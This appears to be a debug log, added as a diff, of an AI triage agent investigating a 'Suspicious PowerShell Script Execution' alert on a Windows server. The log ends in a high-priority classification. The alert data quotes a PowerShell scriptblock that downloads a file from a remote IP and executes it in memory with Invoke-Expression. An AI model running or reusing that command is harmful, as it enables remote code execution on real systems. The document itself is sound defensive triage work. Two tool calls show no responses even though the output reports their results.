@@ -1,0 +1,41 @@
+=== DEBUG SESSION START: 2026-01-25T16:32:24.647956 UTC ===
+
+[PLAYBOOK SELECTION]
+Alert Name: Suspicious PowerShell Script Execution
+Selected Playbook: 'suspicious_powershell.json'
+
+[TOOL CALL]
+Tool: check_ip_reputation
+Arguments: {"ip": "185.199.88.22"}
+
+[TOOL RESPONSE]
+Source IP: 185.199.88.22 | Security Score: 0/100 | ISP: KKB KREDI KAYIT BUROSU ANONIM SIRKETI | Usage Type: Commercial | Privacy Status: Neither VPN nor Proxy nor Tor Node nor Relay
+
+[TOOL CALL]
+Tool: get_recent_events
+Arguments: {}
+
+[TOOL CALL]
+Tool: get_recent_similar_alerts
+Arguments: {}
+
+[FINAL LLM OUTPUT]
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-9471",
+    "Start Time": "2026-01-26T03:42:18.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.2.60.77",
+    "Destination IP": "185.199.88.22",
+    "Endpoint": "SRV-APP-03",
+    "User": "a.petrov",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "Scriptblock": "$u='http://185.199.88.22/update.bin';$b=Invoke-WebRequest -Uri $u -UseBasicParsing;IEX ([Text.Encoding]::UTF8.GetString($b.Content))",
+    "OS": "Windows Server 2022 Datacenter",
+    "IP Reputation Score": "0/100 (ISP: KKB KREDI KAYIT BUROSU ANONIM SIRKETI)",
+    "Recent Similar Alerts": "None found",
+    "Description": "The PowerShell script downloaded a binary from http://185.199.88.22/update.bin and executed its contents in-memory via Invoke-Expression (IEX). It was executed by user a.petrov on SRV-APP-03 and the remote host has a 0/100 reputation with no recent similar activity in the environment. Because this is remote in-memory code execution initiated by a non-service user on a server and the remote host is untrusted with no benign historical context, the activity is classified as High Priority (HP)."
+  },
+  "classification": "HP"
+}
+
